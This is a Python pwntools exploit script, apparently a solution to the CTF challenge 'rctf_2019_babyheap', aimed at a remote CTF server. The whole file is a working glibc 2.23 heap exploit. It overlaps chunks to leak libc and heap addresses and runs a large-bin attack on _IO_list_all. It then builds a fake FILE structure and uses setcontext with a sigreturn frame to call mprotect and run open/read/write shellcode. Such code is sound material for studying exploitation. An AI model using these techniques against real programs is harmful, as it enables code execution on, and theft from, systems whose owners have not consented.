# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './rctf_2019_babyheap'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process([binary])
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26185'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size ):
    cmd(1)
    sla('Size:',size)

def edit(id , text ):
    cmd(2)
    sla('Index:',id)
    sa('Content:',text)

def delete(id ):
    cmd(3)
    sla('Index:',id)

def show(id ):
    cmd(4)
    sla('Index:',id)

def pack_file(_flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = 0,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = 0,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _lock = 0,
    _wide_data = 0,
    _mode = 0):
    file_struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno)
    file_struct = file_struct.ljust(0x88, '\x00')
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, '\x00')
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, '\x00')
    return file_struct

# one_gad = one_gadget(libc.path)
add(0x88)
add(0x428)
add(0xf8)
add(0x18)

delete(0)
edit(1 , '\x00'*0x420 + p64(0x430 + 0x90) )

delete(2)
add(0x88) #0
show(1)


__malloc_hook = l64() - 0x68
libc.address = __malloc_hook - libc.sym['__malloc_hook']
__free_hook = libc.sym['__free_hook']
_IO_list_all = libc.sym['_IO_list_all']
setcontext = libc.sym['setcontext'] + 53
# _IO_str_jumps = libc.address + 0x3c27a0
_IO_str_jumps = libc.address + 0x3c37a0

# delete(0)
add(0x428) #2 #1
add(0xf8)
add(0x418) #5
add(0x18)


delete(5)
delete(1)
show(2)

rl()
heap_addr = u64(p.recv(6).ljust( 8,'\x00'))& 0xfffffffff000

lg('heap_addr',heap_addr)

add(0x418)
add(0x438)

edit(2 , p64(__malloc_hook + 0x10 + 1096)*2 + p64(_IO_list_all - 0x20 )*2)

fake_file = pack_file(_IO_read_base = _IO_list_all-0x10,
                _IO_write_base=0,
                _IO_write_ptr=1,
                _IO_buf_base= heap_addr + 0x5e0 + 0x10,
                _mode=0,)
fake_file += p64(_IO_str_jumps-8)+p64(0)+p64(setcontext)

delete(1)
add(0x438)
add(0x418)


edit(2 , fake_file[0x10:])

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = heap_addr
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc.sym['mprotect']
frame.rsp = heap_addr + 0x5e0 + 0x10 + 0x100

orw_payload = shellcraft.open('flag')
orw_payload +=shellcraft.read(3,heap_addr,0x50)
orw_payload +=shellcraft.write(1,heap_addr,0x50)

payload = str(frame).ljust(0x100,'\x00') + p64(heap_addr + 0x700)+ '\x90'*0x100  + asm(orw_payload)

edit(7 , payload)

lg('_IO_list_all',_IO_list_all)

# dbg('_IO_flush_all_lockp')
cmd(5)


p.interactive()

'''
@File    :   rctf_2019_babyheap.py
@Time    :   2021/08/29 20:43:03
@Author  :   Niyah 
'''